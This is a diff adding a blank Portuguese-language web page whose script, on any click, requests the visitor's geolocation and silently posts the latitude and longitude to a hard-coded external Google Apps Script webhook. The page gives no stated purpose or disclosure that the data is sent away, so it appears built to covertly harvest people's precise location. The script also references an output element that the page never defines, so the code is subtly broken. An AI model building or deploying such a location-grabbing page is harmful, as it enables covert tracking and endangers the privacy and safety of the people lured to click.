@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      background-color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: sans-serif;
+      user-select: none;
+      cursor: pointer;
+    }
+    #output {
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <script>
+    const webhookURL = 'https://script.google.com/macros/s/AKfycbwcKmIcdHX0YfWfLrhqi37n1jxukgy8ET3jNLvds0NfE7PfE8WfgoFcGhm0g55ZVyCYTw/exec';
+
+    document.body.addEventListener('click', () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            const lat = position.coords.latitude.toFixed(6);
+            const lon = position.coords.longitude.toFixed(6);
+            document.getElementById('output').textContent =
+              `Latitude: ${lat} | Longitude: ${lon}`;
+
+            fetch(webhookURL, {
+              method: 'POST',
+              body: JSON.stringify({ latitude: lat, longitude: lon }),
+              headers: { 'Content-Type': 'application/json' }
+            });
+          },
+          error => {
+            document.getElementById('output').textContent =
+              "Permissão negada ou erro ao obter localização.";
+          }
+        );
+      } else {
+        document.getElementById('output').textContent =
+          "Geolocalização não suportada pelo seu navegador.";
+      }
+    });
+  </script>
+</body>
+</html>
